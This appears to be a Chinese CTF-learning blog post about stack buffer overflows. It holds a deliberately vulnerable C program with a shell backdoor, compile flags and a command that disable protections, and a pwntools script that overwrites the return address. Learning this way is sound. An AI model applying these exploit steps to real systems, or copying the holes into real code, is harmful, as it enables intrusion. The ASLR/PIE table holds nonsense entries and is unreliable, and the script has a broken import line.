---
layout:     post   			        # 使用的布局（不需要改）
title:      从0开始学   			# 标题 
subtitle:   pwn(带杂学家  			#副标题
date:       2019-08-08 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

今天从零开始学**stack**,也算是记录一下吧,在这里记录一下特别细的知识点

## 溢出点的探索

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[20];
    read(STDIN_FILENO, buf, 256);
}
void cat()
{
	system("/bin/sh");}
int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

使用`gcc -g -fno-stack-protector -z execstack -o test test.c`依次关掉**Canary**和**NX**,之后我们`echo 0 > /proc/sys/kernel/randomize_va_space`关闭`PIE`

之后`cyclic 50`直接粘贴到运行的程序中,理论上程序会正常退出,我们找到**rbp**的值,使用`cyclic -l (字符串)`后定位到buf和rbp相差32个字节,同时我们应注意把之前的**rbp**进行覆盖,所以应该是40字节
```
#encoding:utf-8
#!/upr/bin/env python
from pwn import
context.log_level = "debug"
p=process("./level1")
binsh =0x00004005D7#通过ida找到的固定地址后门函数
payload = "a"*40+p64(binsh)
p.send(payload)
p.interactive()
```

## ASLR和PIE的各种事

其实我第一遍学的时候以为,emm,这不是一样的东西吗,甚至以为效果是它俩求并就行,靠发现完全不是,[这个](https://blog.csdn.net/Plus_RE/article/details/79199772)写的很棒了,谢谢师傅,在这里简单记录一下诀窍吧

\ |aslr=0 | aslr=1 | aslr=2
:-: | :-: | :-: | :-:
开启PIE | 弥赛亚(Messiah) | 基督(Christ) | 受膏者(the anointed one)
关闭PIE | 1 | 2 | 3

## 死脑筋系列
> 1

其实本题很简单,但是我太死板了,绞尽脑汁想溢出溢出的,最后发现这么简单
```
int a,b;
scanf("%d",&a);
scanf("%d",a*1+0x1235);
if(!b)
	system("/bin/sh");
```
差不多代码这个意思,然后我就想,恩?这怎么溢出啊,后来发现只要找到**b**的地址然后直接让第二个**scanf**直接输入就行了也即,例如`&b=0x1234`,我们直接让**a**的值为-1就好,然后输0就完事了...
